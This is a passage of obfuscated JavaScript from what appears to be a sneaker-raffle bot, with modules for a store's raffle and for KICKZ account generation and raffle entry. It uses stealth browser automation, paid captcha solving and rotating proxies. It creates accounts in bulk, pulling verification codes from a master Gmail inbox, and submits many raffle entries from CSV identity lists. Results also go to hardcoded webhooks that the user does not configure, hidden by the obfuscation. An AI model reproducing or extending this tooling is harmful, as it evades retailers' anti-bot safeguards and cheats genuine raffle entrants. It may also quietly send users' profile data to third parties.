                        console['log'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4fa38a['type']('#comp_firstname', '' + _0x906463[_0xbb5fc0]['FirstName']), await _0x4fa38a['waitForSelector']('#comp_lastname'), await _0x4fa38a['type']('#comp_lastname', '' + _0x906463[_0xbb5fc0]['LastName']), await _0x4fa38a['waitForSelector']('#comp_email'), await _0x4fa38a['type']('#comp_email', '' + _0x906463[_0xbb5fc0]['Email']), await _0x4fa38a['waitForSelector']('#comp_paypalemail'), await _0x4fa38a['type']('#comp_paypalemail', '' + _0x906463[_0xbb5fc0]['Email']), await _0x4fa38a['waitForSelector']('#comp_mobile_end'), await _0x4fa38a['type']('#comp_mobile_end', '' + _0x906463[_0xbb5fc0]['Phone']), await _0x4fa38a['waitForSelector']('#comp_dob'), await _0x4fa38a['type']('#comp_dob', '08/09/1992'), console['log'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x906463[_0xbb5fc0]['Size'] == 'RANDOM') {
                            const _0x464f3c = await _0x4fa38a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x9c18b3 => {
                                return _0x9c18b3['map'](_0xacc621 => _0xacc621['value']);
                            });
                            var _0x5b31f2 = Math['round'](Math['random']() * (_0x464f3c['length'] - 0x2));
                            await _0x4fa38a['select']('#shoesize', _0x464f3c[_0x5b31f2 + 0x1]), await _0x38c39e(0x3e8);
                        } else {
                            const _0x4394dd = await _0x4fa38a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3cd266 => {
                                return _0x3cd266['map'](_0x11ab95 => _0x11ab95['innerText']);
                            }), _0xe7263c = await _0x4fa38a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x585406 => {
                                return _0x585406['map'](_0x2be890 => _0x2be890['value']);
                            });
                            var _0x34f662 = _0x906463[_0xbb5fc0]['Size'];
                            for (var _0x36fc8a = 0x1; _0x36fc8a < _0xe7263c['length']; _0x36fc8a++) {
                                var _0x227218 = _0x4394dd[_0x36fc8a]['split']('\x20')[0x0];
                                if (_0x227218 == _0x34f662) {
                                    await _0x4fa38a['select']('#shoesize', _0xe7263c[_0x36fc8a]);
                                    break;
                                } else {
                                    if (_0x36fc8a + 0x1 == _0xe7263c['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4fa38a['waitForSelector']('#comp_address1'), await _0x4fa38a['type']('#comp_address1', _0x906463[_0xbb5fc0]['Address1'] + '\x20' + _0x906463[_0xbb5fc0]['HouseNumber']), await _0x4fa38a['waitForSelector']('#comp_address2'), await _0x4fa38a['type']('#comp_address2', '' + _0x906463[_0xbb5fc0]['Address2']), await _0x4fa38a['waitForSelector']('#comp_address2'), await _0x4fa38a['type']('#comp_address3', '' + _0x906463[_0xbb5fc0]['City']), await _0x4fa38a['waitForSelector']('#comp_postcode'), await _0x4fa38a['type']('#comp_postcode', '' + _0x906463[_0xbb5fc0]['Zip']), console['log'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x38c39e(0x4b0), await _0x4fa38a['click']('label#emailhold'), await _0x38c39e(0x5dc), await _0x4fa38a['click']('#preauth_tandc_email\x20>\x20label'), await _0x38c39e(0x5dc), await _0x4fa38a['click']('#submit'), await _0x4fa38a['waitForSelector']('#paymentWrap'), console['log'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20' + _0x52c84d['blue']('Awaiting\x20Paypal\x20Payment')), _0x180d0c['on']('targetcreated', async _0xff18f6 => {
                            if (_0xff18f6['type']() === 'page') {
                                const _0x391249 = await _0xff18f6['page']();
                                async function _0x2f864f() {
                                    try {
                                        await _0x4fa38a['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x31facb = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x5d2617() {
                                    try {
                                        await _0x4fa38a['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0xe69618 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x5d2617(), _0x2f864f(), await _0x38c39e(0x493e0);
                            }
                        });
                        async function _0x54551b() {
                            for (let _0x5c383f = 0x0; _0x5c383f < 0x12c; _0x5c383f++) {
                                if (_0xe69618 == !![]) {
                                    _0x51cdc4 = 'no', _0x41f993(_0x906463[_0xbb5fc0], _0x46e3ce), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                        try {
                                            await _0x16a920(_0x5e160d['webhook'], _0x1fbe46['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x1fbe46['succesDEVMSG']), await _0x38c39e(0xc8);
                                    try {
                                        await _0x16a920(_0x2766d4, _0x1fbe46['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x31facb)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x38c39e(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x38c39e(0xbb8), await _0x4fa38a['click']('.zoid-outlet'), await _0x38c39e(0x7d0), await _0x54551b();
                    } catch (_0x4a11ba) {
                        console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20' + _0x4a11ba)), _0xd67bfd = '' + _0x4a11ba;
                        var _0x335867 = await _0x485032(_0x906463[_0xbb5fc0], _0x46e3ce, 'dev', !![], _0xd67bfd);
                        _0x1fbe46['errorDEV'] = { 'embeds': [_0x335867] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x1fbe46['errorDEV']), await _0x16a920(_0x233d0f, _0x1fbe46['errorDEV']);
                    } finally {
                        _0x180d0c && _0x180d0c['close']();
                        if (_0x51cdc4 == 'yes' && _0x3a60eb != 0x5 && _0xd67bfd != 'Size\x20Not\x20Found') {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Retrying')), _0xbb5fc0 = _0xbb5fc0 - 0x1, _0x3a60eb = _0x3a60eb + 0x1;
                            continue;
                        }
                        _0x51cdc4 == 'yes' && _0x3a60eb >= 0x5 && (_0x1ac5d5(afew[_0xbb5fc0], _0x46e3ce), _0x51cdc4 = 'no', _0x3a60eb = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x500c10, _0x52d0a3, _0x5deb2d) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x54d79c = 0x0; _0x54d79c < _0x52d0a3['length']; _0x54d79c++) {
                        const _0xa9fa9 = 'https://www.kickz.com/login';
                        if (_0x5baf36 != 'yes')
                            var _0x5baf36 = '', _0x444439 = 0x0;
                        _0x2ad028(_0x500c10['name'] + '\x20Task\x20' + (_0x54d79c + 0x1) + '\x20/\x20' + _0x52d0a3['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x52d0a3, _0x54d79c);
                        var _0x4bb12c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a338
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5e160d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xa56f6b
                                }
                            ]
                        }];
                        const _0x4bf1a6 = { 'embeds': _0x4bb12c };
                        var _0x44cced = await _0x485032(_0x52d0a3[_0x54d79c], _0x500c10, 'acc', ![]);
                        const _0x6f39ee = { 'succesDEVMSG': { 'embeds': [_0x44cced] } };
                        if (_0x52d0a3[_0x54d79c]['Email'] == '' || _0x52d0a3[_0x54d79c]['FirstName'] == '' || _0x52d0a3[_0x54d79c]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x52d0a3[_0x54d79c]['Password'] == '' && (_0x52d0a3[_0x54d79c]['Password'] = 'JRaffles23!');
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x272a04 = _0x5deb2d[_0x54d79c]['split'](':');
                        else
                            var _0x4bcabe = Math['round'](Math['random']() * (_0x5deb2d['length'] - 0x1)), _0x272a04 = _0x5deb2d[_0x4bcabe]['split'](':');
                        const _0x2cf040 = await _0x3d68d8['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x272a04[0x0] + ':' + _0x272a04[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x34734f = await _0x2cf040['newPage']();
                            await _0x34734f['authenticate']({
                                'username': '' + _0x272a04[0x2],
                                'password': '' + _0x272a04[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34734f['setRequestInterception'](!![]), _0x34734f['on']('request', _0x18d160 => {
                                _0x18d160['resourceType']() === 'image' || _0x18d160['resourceType']() === 'font' || _0x18d160['resourceType']() === 'media' ? _0x18d160['abort']() : _0x18d160['continue']();
                            }), await _0x34734f['goto'](_0xa9fa9), await _0x38c39e(0xbb8), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x34734f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x34734f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x34734f['waitForSelector']('#button-register'), await _0x38c39e(0x7d0), await _0x34734f['evaluate'](() => {
                                const _0x3c0502 = document['querySelector']('#button-register');
                                _0x3c0502['click']();
                            }), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x38c39e(0x1388), await _0x34734f['waitForSelector']('#customer_salutation'), await _0x34734f['select']('#customer_salutation', 'mr'), await _0x38c39e(0x7d0), await _0x34734f['waitForSelector']('#customer_firstname'), await _0x34734f['type']('#customer_firstname', '' + _0x52d0a3[_0x54d79c]['FirstName']), await _0x38c39e(0x352), await _0x34734f['waitForSelector']('#customer_lastname'), await _0x34734f['type']('#customer_lastname', '' + _0x52d0a3[_0x54d79c]['LastName']), await _0x38c39e(0x352), await _0x34734f['type']('#email-input', '' + _0x52d0a3[_0x54d79c]['Email']), await _0x38c39e(0x352), await _0x34734f['type']('#email-confirm-input', '' + _0x52d0a3[_0x54d79c]['Email']), await _0x38c39e(0x352), await _0x34734f['type']('#register-password', '' + _0x52d0a3[_0x54d79c]['Password']), await _0x38c39e(0x352), await _0x34734f['type']('#password-confirm', '' + _0x52d0a3[_0x54d79c]['Password']), await _0x38c39e(0x352), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x34734f['click']('#consent'), await _0x38c39e(0x1f4);
                            const _0x1cd733 = await _0x34734f['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1cd733) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x34734f['click']('#buttonRegister');
                            try {
                                await _0x34734f['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x52d0a3[_0x54d79c]['Email']), await _0x38c39e(0x4b0);
                            async function _0x3f6c64() {
                                var _0x66c309, _0x45608a = ![];
                                for (var _0x43fd5e = 0x0; _0x43fd5e < 0x18; _0x43fd5e++) {
                                    async function _0x4c9333() {
                                        var _0x187104 = new _0xdc01cc({
                                            'user': _0x5e160d['masterMail'],
                                            'password': _0x5e160d['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x884793(_0x3a4a0e) {
                                            _0x187104['openBox']('INBOX', ![], _0x3a4a0e);
                                        }
                                        _0x187104['once']('ready', function () {
                                            console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x884793(function (_0x26626a, _0x3aac3d) {
                                                console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x26626a)
                                                    throw _0x26626a;
                                                _0x187104['seq']['search'](['UNSEEN'], function (_0x13cc9e, _0x8cd51b) {
                                                    if (!_0x8cd51b || !_0x8cd51b['length'])
                                                        console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x187104['end']();
                                                    else {
                                                        var _0x9590c2 = _0x187104['seq']['fetch'](_0x8cd51b, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x9590c2['on']('message', function (_0x1b2e14, _0x4500b5) {
                                                            var _0x3c33d1 = '(#' + _0x4500b5 + ')\x20';
                                                            _0x1b2e14['on']('body', function (_0x1f8793, _0x592751) {
                                                                _0x31366c(_0x1f8793, (_0x31b0e8, _0xe29954) => {
                                                                    if (_0xe29954['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x23dd70 = _0xe29954['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x489aef = _0x23dd70[0x1]['split']('<')[0x0];
                                                                        _0x66c309 = _0x489aef;
                                                                    }
                                                                });
                                                            }), _0x1b2e14['once']('end', function () {
                                                            });
                                                        }), _0x9590c2['once']('error', function (_0xf5acc1) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x9590c2['once']('end', function () {
                                                            _0x187104['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x187104['once']('error', function (_0x247988) {
                                            console['log'](_0x52c84d['red'](_0x247988['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x45608a = !![];
                                        }), _0x187104['once']('end', async function () {
                                        }), _0x187104['connect']();
                                    }
                                    _0x4c9333(), await _0x38c39e(0x1388);
                                    if (_0x66c309)
                                        return _0x66c309;
                                    if (_0x45608a)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x43fd5e == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3f6c64(), _0x38c39e(0x320), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Verifying..'), await _0x34734f['type']('#verificationCode', code), await _0x38c39e(0x1f4), await _0x34734f['click']('#buttonVerify'), await _0x38c39e(0x190), await _0x34734f['click']('#buttonVerify'), await _0x38c39e(0x3e8);
                            try {
                                await _0x34734f['waitForSelector']('div.b-user_greeting'), _0x5baf36 = 'no', console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Account\x20' + _0x52d0a3[_0x54d79c]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x4d1c4a['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x52d0a3[_0x54d79c]['Email'] + ',' + _0x52d0a3[_0x54d79c]['Password'] + ','), console['log'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Account\x20' + _0x52d0a3[_0x54d79c]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x6f39ee['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16a920(_0x244950, _0x6f39ee['succesDEVMSG']);
                            } catch {
                                _0x5baf36 = 'no', console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x44c2a9) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20' + _0x44c2a9)), _0x4bb12c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4bb12c[0x0]['description'] = '' + _0x44c2a9, await _0x16a920(_0x233d0f, _0x4bf1a6), _0x5baf36 = 'yes';
                        } finally {
                            _0x2cf040 && _0x2cf040['close']();
                            if (_0x5baf36 == 'yes' && _0x444439 != 0x5) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x500c10['name'] + ']\x20Task\x20' + (_0x54d79c + 0x1) + '\x20:\x20Retrying')), _0x54d79c = _0x54d79c - 0x1, _0x444439 = _0x444439 + 0x1;
                                continue;
                            }
                            _0x5baf36 == 'yes' && _0x444439 >= 0x5 && (_0x1ac5d5(_0x52d0a3[_0x54d79c], _0x500c10), _0x5baf36 = 'no', _0x444439 = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x47cdbb, _0x24a850, _0x10023e) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3dba94 = 0x0; _0x3dba94 < _0x24a850['length']; _0x3dba94++) {
                        var _0x1a2d3a;
                        if (_0x41e642 != 'yes')
                            var _0x41e642 = '', _0xec5b0d = 0x0;
                        _0x2ad028(_0x47cdbb['name'] + '\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20/\x20' + _0x24a850['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        var _0x348c9e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a338
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x24a850[_0x3dba94]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x24a850[_0x3dba94]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5e160d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xa56f6b
                                }
                            ]
                        }], _0x2ae266 = await _0x485032(_0x24a850[_0x3dba94], _0x47cdbb, 'dev', ![]), _0x327d59 = await _0x485032(_0x24a850[_0x3dba94], _0x47cdbb, 'pub', ![]);
                        const _0x3f9478 = {
                            'succesDEVMSG': { 'embeds': [_0x2ae266] },
                            'succesPUBMSG': { 'embeds': [_0x327d59] }
                        };
                        await _0x3962cc(_0x24a850, _0x3dba94);
                        if (_0x24a850[_0x3dba94]['Email'] == '' || _0x24a850[_0x3dba94]['Password'] == '' || _0x24a850[_0x3dba94]['FirstName'] == '' || _0x24a850[_0x3dba94]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x37ecc4 = _0x10023e[_0x3dba94]['split'](':');
                        else
                            var _0x328738 = Math['round'](Math['random']() * (_0x10023e['length'] - 0x1)), _0x37ecc4 = _0x10023e[_0x328738]['split'](':');
                        const _0x5bfd81 = await _0x3d68d8['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x37ecc4[0x0] + ':' + _0x37ecc4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x49e05f = await _0x5bfd81['newPage']();
                            await _0x49e05f['authenticate']({
                                'username': '' + _0x37ecc4[0x2],
                                'password': '' + _0x37ecc4[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49e05f['setRequestInterception'](!![]), _0x49e05f['on']('request', _0x531444 => {
                                _0x531444['resourceType']() === 'image' || _0x531444['resourceType']() === 'font' || _0x531444['resourceType']() === 'media' ? _0x531444['abort']() : _0x531444['continue']();
                            }), await _0x49e05f['goto']('' + _0x24a850[_0x3dba94]['Url'], { 'waitUntil': 'networkidle2' }), await _0x38c39e(0x12c);
                            try {
                                await _0x49e05f['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x49e05f['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Logging\x20in'), await _0x49e05f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x49e05f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x49e05f['waitForSelector']('#username'), await _0x49e05f['type']('#username', _0x24a850[_0x3dba94]['Email']), await _0x49e05f['waitForSelector']('#password'), await _0x49e05f['type']('#password', _0x24a850[_0x3dba94]['Password']), await _0x38c39e(0x190), await _0x49e05f['click']('#buttonSubmit'), await _0x49e05f['waitForSelector']('div.b-user_greeting'), console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x38c39e(0x1f4), await _0x49e05f['goto']('' + _0x24a850[_0x3dba94]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x24a850[_0x3dba94]['Size']);
                            let _0x4a8a8a = _0x24a850[_0x3dba94]['Size']['replace']('.5', '\x201/2');
                            await _0x49e05f['click']('button[title=\x22' + _0x4a8a8a + '\x22]'), await _0x38c39e(0x1f4);
                            try {
                                await _0x49e05f['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x38c39e(0x12c), console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x49e05f['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_firstName', _0x24a850[_0x3dba94]['FirstName']), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_lastName', _0x24a850[_0x3dba94]['LastName']), await _0x38c39e(0x12c), await _0x49e05f['select']('#dwfrm_raffle_addressFields_country', _0x24a850[_0x3dba94]['Country']), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_city', _0x24a850[_0x3dba94]['City']), await _0x38c39e(0x12c);
                            _0x24a850[_0x3dba94]['Postcode'] == undefined && (_0x24a850[_0x3dba94]['Postcode'] = _0x24a850[_0x3dba94]['Zip']);
                            await _0x49e05f['type']('#dwfrm_raffle_addressFields_postalCode', _0x24a850[_0x3dba94]['Postcode']), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_address1', _0x24a850[_0x3dba94]['Address1']), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_address2', _0x24a850[_0x3dba94]['HouseNumber']), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x24a850[_0x3dba94]['Address2']), await _0x38c39e(0x12c), await _0x49e05f['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x38c39e(0x12c), await _0x49e05f['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x24a850[_0x3dba94]['Follower']), await _0x38c39e(0x1f4), await _0x49e05f['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x38c39e(0x1f4), console['log'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20' + _0x52c84d['blue']('Awaiting\x20Paypal\x20Payment')), await _0x49e05f['click']('.b-paypal_button');
                            try {
                                await _0x49e05f['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x41e642 = 'no', _0x41f993(_0x24a850[_0x3dba94], _0x47cdbb), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3f9478['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x3f9478['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x2766d4, _0x3f9478['succesPUBMSG']);
                            } catch (_0x3c5487) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3c5487)), _0x1a2d3a = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3c5487;
                                var _0x2e1187 = await _0x485032(_0x24a850[_0x3dba94], _0x47cdbb, 'dev', !![], _0x1a2d3a);
                                _0x3f9478['errorDEV'] = { 'embeds': [_0x2e1187] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3f9478['errorDEV']), await _0x16a920(_0x233d0f, _0x3f9478['errorDEV']);
                            }
                        } catch (_0x216a7b) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x47cdbb['name'] + ']\x20Task\x20' + (_0x3dba94 + 0x1) + '\x20:\x20' + _0x216a7b)), _0x1a2d3a = '' + _0x216a7b;
                            var _0x2e1187 = await _0x485032(_0x24a850[_0x3dba94], _0x47cdbb, 'dev', !![], _0x1a2d3a);
                            _0x3f9478['errorDEV'] = { 'embeds': [_0x2e1187] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3f9478['errorDEV']), await _0x16a920(_0x233d0f, _0x3f9478['errorDEV']), _0x41e642 = 'yes';
                        } finally {
                            _0x5bfd81 && _0x5bfd81['close']();
